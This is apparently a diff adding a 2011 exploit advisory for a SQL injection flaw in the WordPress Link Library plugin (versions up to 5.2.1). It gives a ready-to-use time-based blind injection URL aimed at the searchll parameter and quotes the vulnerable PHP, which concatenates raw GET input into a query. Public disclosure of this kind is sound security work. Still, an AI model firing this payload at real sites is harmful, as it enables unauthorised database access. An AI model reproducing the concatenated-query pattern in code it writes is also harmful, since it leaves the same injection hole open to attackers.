@@ -1,0 +1,44 @@
+# Exploit Title: WordPress Link Library plugin <= 5.2.1 SQL Injection Vulnerability
+# Date: 2011-09-16
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/link-library.zip
+# Version: 5.2.1 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/link-library/link-library-ajax.php?searchll=-1')/**/AND/**/1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)%23
+
+---------------
+Vulnerable code
+---------------
+./link-library-ajax.php:
+    echo $my_link_library_plugin->LinkLibrary(...);
+
+./link-library.php:
+    class link_library_plugin {
+        ...
+        function LinkLibrary(...) {
+            return $this->PrivateLinkLibrary(...)
+        ...
+        function PrivateLinkLibrary(...) {
+            ...
+            if ($_GET['searchll'] != "")
+            {
+                $searchterms = explode(" ", $_GET['searchll']);
+
+                if ($searchterms)
+                {
+                    $mode = "search";
+                    $termnb = 1;
+
+                    foreach($searchterms as $searchterm)
+                    {
+                        if ($termnb == 1)
+                        {
+                            $linkquery .= " AND (link_name like '%" . $searchterm . "%' ";
+                            $termnb++;
+                        }
+            ...
+            $linkitems = $wpdb->get_results($linkquery, ARRAY_A);
